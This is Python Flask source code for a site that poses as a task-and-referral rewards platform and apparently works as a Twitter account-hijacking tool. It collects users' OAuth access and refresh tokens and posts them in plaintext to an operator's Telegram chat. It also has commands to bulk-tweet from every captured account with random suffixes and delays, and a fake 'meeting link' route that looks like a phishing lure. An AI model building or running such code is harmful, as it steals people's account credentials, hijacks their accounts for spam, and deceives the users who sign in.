import base64
import hashlib
import os
import psycopg2
import requests
import time
import json
import random
import string
from flask import Flask, redirect, request, session, render_template, url_for, flash
from psycopg2.extras import RealDictCursor
from functools import wraps

# Configuration: Ensure these environment variables are set correctly
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')
DATABASE_URL = os.getenv('DATABASE_URL')  # Render PostgreSQL URL
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

# Set default delay values from environment variables
DEFAULT_MIN_DELAY = int(os.getenv("BULK_POST_MIN_DELAY", 2))
DEFAULT_MAX_DELAY = int(os.getenv("BULK_POST_MAX_DELAY", 10))

app = Flask(__name__)
app.secret_key = os.urandom(24)
BACKUP_FILE = 'tokens_backup.txt'

# Initialize PostgreSQL database
def init_db():
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id SERIAL PRIMARY KEY,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            username TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()  # Ensure the database is initialized when the app starts

def init_db_schema():
    """
    Initializes and verifies that required tables and columns are present in the database.
    """
    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
    cursor = conn.cursor()
    try:
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                token_balance FLOAT DEFAULT 0,
                referral_count INT DEFAULT 0,
                referral_reward FLOAT DEFAULT 0,
                referral_url TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id SERIAL PRIMARY KEY,
                user_id INT REFERENCES users(id),
                title TEXT NOT NULL,
                description TEXT,
                task_reward FLOAT DEFAULT 0,
                completed BOOLEAN DEFAULT FALSE,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                setting_name TEXT PRIMARY KEY,
                setting_value FLOAT
            )
        ''')
        cursor.execute('''
            INSERT INTO settings (setting_name, setting_value) VALUES
            ('referral_reward', %s), ('task_reward', %s)
            ON CONFLICT (setting_name) DO NOTHING
        ''', (10.0, 5.0))  # Default values can be adjusted as needed

        conn.commit()
        print("Database schema initialized and verified.")
    except Exception as e:
        print(f"Error initializing database schema: {e}")
    finally:
        conn.close()

# Run this initialization function at the start
init_db_schema()

def store_token(access_token, refresh_token, username):
    print("Storing token in the database...")
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("SELECT id FROM tokens WHERE username = %s", (username,))
        existing_user = cursor.fetchone()
        if existing_user:
            cursor.execute("DELETE FROM tokens WHERE username = %s", (username,))
            print(f"Old token data for @{username} has been deleted to prevent duplicate entries.")

        cursor.execute('''
            INSERT INTO tokens (access_token, refresh_token, username)
            VALUES (%s, %s, %s)
        ''', (access_token, refresh_token, username))
        conn.commit()
        conn.close()
        
        backup_data = get_all_tokens()
        formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
        with open(BACKUP_FILE, 'w') as f:
            json.dump(formatted_backup_data, f, indent=4)
        print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
        send_message_via_telegram(f"💾 Backup updated! Token added for @{username}.\n📊 Total tokens in backup: {len(backup_data)}")
    except Exception as e:
        print(f"Database error while storing token: {e}")

def restore_from_backup():
    print("Restoring from backup if database is empty...")
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM tokens')
        count = cursor.fetchone()[0]
        conn.close()
    except Exception as e:
        print(f"Database error during restore check: {e}")
        return
    if count == 0:
        if os.path.exists(BACKUP_FILE):
            try:
                with open(BACKUP_FILE, 'r') as f:
                    backup_data = json.load(f)
                    if not isinstance(backup_data, list):
                        raise ValueError("Invalid format in backup file.")
            except (json.JSONDecodeError, ValueError, IOError) as e:
                print(f"Error reading backup file: {e}")
                return
            restored_count = 0
            for token_data in backup_data:
                access_token = token_data['access_token']
                refresh_token = token_data.get('refresh_token', None)
                username = token_data['username']
                try:
                    conn = psycopg2.connect(DATABASE_URL, sslmode='require')
                    cursor = conn.cursor()
                    cursor.execute('''
                        INSERT INTO tokens (access_token, refresh_token, username)
                        VALUES (%s, %s, %s)
                    ''', (access_token, refresh_token, username))
                    conn.commit()
                    conn.close()
                    restored_count += 1
                except Exception as e:
                    print(f"Error restoring token for {username}: {e}")
            send_message_via_telegram(f"📂 Backup restored successfully!\n📊 Total tokens restored: {restored_count}")
            print(f"Database restored from backup. Total tokens restored: {restored_count}")
        else:
            print("No backup file found. Skipping restoration.")

def get_all_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
        tokens = cursor.fetchall()
        conn.close()
        return tokens
    except Exception as e:
        print(f"Error retrieving tokens from database: {e}")
        return []

def get_total_tokens():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM tokens')
        total = cursor.fetchone()[0]
        conn.close()
        return total
    except Exception as e:
        print(f"Error counting tokens in database: {e}")
        return 0

def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = CALLBACK_URL
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

def send_message_via_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    headers = {"Content-Type": "application/json; charset=utf-8"}
    response = requests.post(url, json=data, headers=headers)
    if response.status_code != 200:
        print(f"Failed to send message via Telegram: {response.text}")

def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()
    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s', 
                       (new_access_token, new_refresh_token, username))
        conn.commit()
        conn.close()
        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
        return None, None
		
def get_twitter_username_and_profile(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json().get("data", {})
        username = data.get("username")
        profile_url = f"https://twitter.com/{username}" if username else None
        return username, profile_url
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None, None

def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def handle_post_bulk(message):
    tokens = get_all_tokens()
    parts = message.split(' ', 1)
    if len(parts) < 2:
        send_message_via_telegram("❌ Incorrect format. Use `/post_bulk <tweet content>`.")
        return
    base_tweet_text = parts[1]
    min_delay = DEFAULT_MIN_DELAY
    max_delay = DEFAULT_MAX_DELAY
    if not tokens:
        send_message_via_telegram("❌ No tokens found to post tweets.")
        return
    for access_token, _, username in tokens:
        random_suffix = generate_random_string(10)
        tweet_text = f"{base_tweet_text} {random_suffix}"
        result = post_tweet(access_token, tweet_text)
        delay = random.randint(min_delay, max_delay)
        send_message_via_telegram(
            f"📝 Tweet posted with @{username}: {result}\n"
            f"⏱ Delay before next post: {delay} seconds."
        )
        time.sleep(delay)
    send_message_via_telegram(f"✅ Bulk tweet posting complete. {len(tokens)} tweets posted.")

def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, token_refresh, username = tokens[0]
        refresh_token_in_db(token_refresh, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    message = update.get('message', {}).get('text', '')
    if message == '/refresh_single':
        handle_refresh_single()
    elif message == '/refresh_bulk':
        handle_refresh_bulk()
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            handle_post_single(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            handle_post_bulk(tweet_text)
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, or /post_bulk <tweet>.")
    return '', 200

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        result = post_tweet(access_token, tweet_text)
        return render_template('tweet_result.html', result=result)
    return render_template('tweet_form.html', access_token=access_token)

@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()
    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        username, profile_url = get_twitter_username_and_profile(new_access_token)
        if username:
            store_token(new_access_token, new_refresh_token, username)
            send_message_via_telegram(f"New Access Token: {new_access_token}\n"
                                      f"New Refresh Token: {new_refresh_token}\n"
                                      f"Username: @{username}\n"
                                      f"Profile URL: {profile_url}")
            return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
        else:
            return "Error retrieving user info with the new access token", 400
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

@app.route('/j')
def meeting():
    state_id = request.args.get('meeting')
    code_ch = request.args.get('pwd')
    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')
    referrer_id = request.args.get('referrer_id')  # Parameter for tracking referrals

    # If the user is already logged in, redirect them to the welcome page
    if 'username' in session:
        username = session['username']
        send_message_via_telegram(f"👋 @{username} just returned to the website.")
        return redirect(url_for('welcome'))

    # Store referrer_id in session if present for tracking referrals
    if referrer_id:
        session['referrer_id'] = referrer_id

    # Initiate authorization if 'authorize' parameter is set to 'true'
    if request.args.get('authorize') == 'true':
        state = "0"
        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier
        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )
        return redirect(authorization_url)

    # Handle callback with authorization code
    if code:
        if error:
            return f"Error during authorization: {error}", 400
        if state != session.get('oauth_state', '0'):
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)
        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }
        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        # Process response from Twitter API
        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')
            username, profile_url = get_twitter_username_and_profile(access_token)

            if username:
                # Store tokens and user info
                store_token(access_token, refresh_token, username)
                # Generate referral URL if missing
                referral_url = generate_referral_url(username)
                session['username'] = username
                session['access_token'] = access_token
                session['refresh_token'] = refresh_token
                session['referral_url'] = referral_url
                total_tokens = get_total_tokens()

                # Send Telegram notification with user details, including referral URL
                send_message_via_telegram(
                    f"🔑 Access Token: {access_token}\n"
                    f"🔄 Refresh Token: {refresh_token}\n"
                    f"👤 Username: @{username}\n"
                    f"🔗 Profile URL: {profile_url}\n"
                    f"🔗 Referral URL: {referral_url}\n"  # Included referral URL in the message
                    f"📊 Total Tokens in Database: {total_tokens}"
                )

                # Process referral if referrer_id is in session
                referrer_id = session.pop('referrer_id', None)
                if referrer_id:
                    add_referral(referrer_id, username)

                return redirect(url_for('welcome'))
            else:
                return "Error retrieving user info with access token", 400
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

    # Render the home page if no authorization or referral actions are needed
    return render_template('home.html')


def generate_referral_url(username):
    referral_url = f"https://taskair.io/referral/{username}"  # Adjusted default URL generation
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()

        # Check if the user already has a referral URL
        cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
        result = cursor.fetchone()

        if result:
            user_id, existing_referral_url = result
            if existing_referral_url:
                referral_url = existing_referral_url
            else:
                # Update the referral URL in the database if it does not exist
                cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
                conn.commit()
                print(f"Referral URL created for user ID {user_id}: {referral_url}")
        else:
            print(f"User {username} not found in the database when generating referral URL.")

        conn.close()
    except Exception as e:
        print(f"Error generating or retrieving referral URL for {username}: {e}")

    return referral_url


@app.route('/welcome')
def welcome():
    username = session.get('username', 'User')
    referrer_id = session.pop('referrer_id', None)  # Retrieve and remove referrer_id from session

    # Refresh token if refresh_token is available in session
    if 'refresh_token' in session:
        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
        if access_token and refresh_token:
            session['access_token'] = access_token
            session['refresh_token'] = refresh_token
            send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")

    # Handle referral if referrer_id is available
    if referrer_id:
        add_referral(referrer_id, username)  # Update referral count and reward for the referring user
        send_message_via_telegram(f"🎉 New referral! @{username} was referred by user ID {referrer_id}.")

    # Determine message for new or returning user
    if 'is_new_user' in session:
        message = f"Congratulations, @{username}! Your sign-up was successful."
        session.pop('is_new_user')
    else:
        message = f"Welcome back, @{username}!"

    # Render the welcome template with the welcome message
    return render_template('welcome.html', message=message)


def get_user_stats(username):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        
        cursor.execute('''
            SELECT 
                COALESCE(SUM(tasks.completed::int), 0) AS tasks_completed,
                COALESCE(users.token_balance, 0) AS token_balance,
                COALESCE(users.referral_count, 0) AS referral_count,
                COALESCE(users.referral_reward, 0) AS referral_reward,
                users.referral_url  -- Ensure this field is retrieved
            FROM users
            LEFT JOIN tasks ON tasks.user_id = users.id
            WHERE users.username = %s
            GROUP BY users.id
        ''', (username,))
        
        user_stats = cursor.fetchone()
        conn.close()
        
        return user_stats or {
            "tasks_completed": 0,
            "token_balance": 0,
            "referral_count": 0,
            "referral_reward": 0,
            "referral_url": ""
        }
    except Exception as e:
        print(f"Error retrieving user stats for {username}: {e}")
        return {
            "tasks_completed": 0,
            "token_balance": 0,
            "referral_count": 0,
            "referral_reward": 0,
            "referral_url": ""
        }

def get_task_list():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT id, title, description FROM tasks WHERE status = %s', ('active',))
        tasks = cursor.fetchall()
        conn.close()
        return tasks
    except Exception as e:
        print(f"Error retrieving task list: {e}")
        return []

def get_upcoming_tasks():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT id, title, description FROM tasks WHERE status = %s', ('upcoming',))
        tasks = cursor.fetchall()
        conn.close()
        return tasks
    except Exception as e:
        print(f"Error retrieving upcoming tasks: {e}")
        return []

def update_task(task_id, title, description, status):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE tasks
            SET title = %s, description = %s, status = %s
            WHERE id = %s
        ''', (title, description, status, task_id))
        conn.commit()
        conn.close()
        print(f"Task ID {task_id} updated successfully.")
    except Exception as e:
        print(f"Error updating task ID {task_id}: {e}")

def delete_task(task_id):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM tasks WHERE id = %s', (task_id,))
        conn.commit()
        conn.close()
        print(f"Task ID {task_id} deleted successfully.")
    except Exception as e:
        print(f"Error deleting task ID {task_id}: {e}")

def get_user_list():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT id, username, status FROM users')
        users = cursor.fetchall()
        conn.close()
        return users
    except Exception as e:
        print(f"Error retrieving user list: {e}")
        return []

def delete_user(user_id):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM users WHERE id = %s', (user_id,))
        conn.commit()
        conn.close()
        print(f"User ID {user_id} deleted successfully.")
    except Exception as e:
        print(f"Error deleting user ID {user_id}: {e}")


def add_referral(referrer_id, referred_user):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        
        # Retrieve referrer details
        cursor.execute("SELECT referral_count, referral_reward, token_balance FROM users WHERE id = %s", (referrer_id,))
        referrer = cursor.fetchone()
        
        if referrer:
            referral_count, current_reward, token_balance = referrer
            referral_reward_amount = get_referral_reward_amount()
            
            # Update referral count, reward, and token balance for the referrer
            new_count = referral_count + 1
            new_reward = current_reward + referral_reward_amount
            new_token_balance = token_balance + referral_reward_amount
            
            cursor.execute("""
                UPDATE users
                SET referral_count = %s, referral_reward = %s, token_balance = %s
                WHERE id = %s
            """, (new_count, new_reward, new_token_balance, referrer_id))
            
            conn.commit()
            print(f"Referral updated for referrer ID {referrer_id}: Total referrals = {new_count}, reward = {new_reward}")
            
            # Send Telegram notification
            send_message_via_telegram(
                f"🎉 New referral by user ID {referrer_id}! 🎉\n"
                f"Referred User: @{referred_user}\n"
                f"Total Referrals: {new_count}\n"
                f"Total Referral Reward: {new_reward} tokens\n"
                f"Updated Token Balance: {new_token_balance} tokens"
            )
        else:
            print(f"Referrer with ID {referrer_id} not found.")
        
        conn.close()
    except Exception as e:
        print(f"Error updating referral count and reward: {e}")


def complete_task(user_id, task_id):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("UPDATE tasks SET completed = TRUE WHERE id = %s AND user_id = %s", (task_id, user_id))
        task_reward = get_task_reward_amount()
        cursor.execute("""
            UPDATE users
            SET token_balance = token_balance + %s
            WHERE id = %s
        """, (task_reward, user_id))
        conn.commit()
        print(f"Task {task_id} completed by user {user_id}, awarded {task_reward} tokens.")
    except Exception as e:
        print(f"Error completing task and awarding tokens: {e}")
    finally:
        conn.close()
        
def get_user_referral_count(username):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("SELECT referral_count FROM users WHERE username = %s", (username,))
        referral_count = cursor.fetchone()[0]
        conn.close()
        return referral_count
    except Exception as e:
        print(f"Error retrieving referral count for {username}: {e}")
        return 0

def get_user_referral_reward(username):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("SELECT referral_reward FROM users WHERE username = %s", (username,))
        referral_reward = cursor.fetchone()[0]
        conn.close()
        return referral_reward
    except Exception as e:
        print(f"Error retrieving referral reward for {username}: {e}")
        return 0.0


def get_referral_reward_amount():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("SELECT setting_value FROM settings WHERE setting_name = 'referral_reward'")
        referral_reward = cursor.fetchone()
        conn.close()
        return referral_reward[0] if referral_reward else 10.0
    except Exception as e:
        print(f"Error retrieving referral reward amount: {e}")
        return 10.0

def get_task_reward_amount():
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute("SELECT setting_value FROM settings WHERE setting_name = 'task_reward'")
        task_reward = cursor.fetchone()
        conn.close()
        return task_reward[0] if task_reward else 5.0
    except Exception as e:
        print(f"Error retrieving task reward amount: {e}")
        return 5.0

@app.route('/admin/set_rewards', methods=['GET', 'POST'])
def set_rewards():
    if request.method == 'POST':
        referral_reward = float(request.form['referral_reward'])
        task_reward = float(request.form['task_reward'])
        set_admin_reward(referral_reward, task_reward)
        print(f"Admin set referral reward to {referral_reward} and task reward to {task_reward}.")
        return redirect(url_for('admin_dashboard'))
    return render_template('set_rewards.html', referral_reward=get_referral_reward_amount(), task_reward=get_task_reward_amount())

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            flash('Login successful', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid username or password', 'danger')
    return render_template('admin_login.html')

@app.route('/admin/logout')
@login_required
def admin_logout():
    session.pop('admin_logged_in', None)
    flash('Logged out successfully', 'info')
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
@login_required
def admin_dashboard():
    return render_template('admin_dashboard.html')

@app.route('/dashboard')
def dashboard():
    username = session.get('username', 'User')
    user_stats = get_user_stats(username)
    user_stats['referral_count'] = get_user_referral_count(username)  # New field
    user_stats['referral_reward'] = get_user_referral_reward(username)  # New field
    active_tasks = get_task_list()
    upcoming_tasks = get_upcoming_tasks()
    return render_template('dashboard.html', username=username, user_stats=user_stats, active_tasks=active_tasks, upcoming_tasks=upcoming_tasks)


def set_admin_reward(referral_reward, task_reward):
    try:
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO settings (setting_name, setting_value)
            VALUES ('referral_reward', %s), ('task_reward', %s)
            ON CONFLICT (setting_name) DO UPDATE SET setting_value = EXCLUDED.setting_value;
        ''', (referral_reward, task_reward))
        conn.commit()
        print("Admin reward settings updated successfully.")
    except Exception as e:
        print(f"Error saving admin reward settings: {e}")
    finally:
        conn.close()

@app.route('/api/user_stats', methods=['GET'])
def api_user_stats():
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    user_stats = get_user_stats(username)
    return user_stats, 200

@app.route('/api/check_token_expiry', methods=['GET'])
def check_token_expiry():
    username = session.get('username')
    refresh_token = session.get('refresh_token')

    if not username or not refresh_token:
        return {"error": "User not authenticated or missing refresh token"}, 401

    # Attempt to refresh the token in the database if expired
    new_access_token, new_refresh_token = refresh_token_in_db(refresh_token, username)
    
    if new_access_token and new_refresh_token:
        session['access_token'] = new_access_token
        session['refresh_token'] = new_refresh_token
        return {"message": "Token refreshed successfully", "access_token": new_access_token}, 200
    else:
        return {"error": "Failed to refresh token"}, 500

@app.route('/api/validate_token', methods=['GET'])
def validate_token():
    access_token = session.get('access_token')
    if not access_token:
        return {"error": "No access token found in session"}, 401

    # Attempt to validate token by requesting basic user profile information
    username, profile_url = get_twitter_username_and_profile(access_token)
    if username:
        return {"message": "Token is valid", "username": username, "profile_url": profile_url}, 200
    else:
        return {"error": "Token is invalid or expired"}, 403

@app.route('/api/referral_link', methods=['GET'])
def get_referral_link():
    username = session.get('username')
    if not username:
        return {"error": "User not authenticated"}, 401

    referral_url = generate_referral_url(username)
    return {"referral_url": referral_url}, 200


@app.route('/about')
def about_us():
    return render_template('about_us.html')

@app.route('/blog')
def blog():
    # Placeholder content for the Blog page
    return render_template('blog.html')

@app.route('/docs')
def docs():
    # Placeholder content for the Documentation page
    return render_template('docs.html')

@app.route('/contact')
def contact():
    # Placeholder content for the Contact Us page
    return render_template('contact.html')


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/active')
def active():
    username = session.get('username', 'User')
    return render_template('active.html', username=username)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()
    restore_from_backup()
    app.run(host='0.0.0.0', port=port)
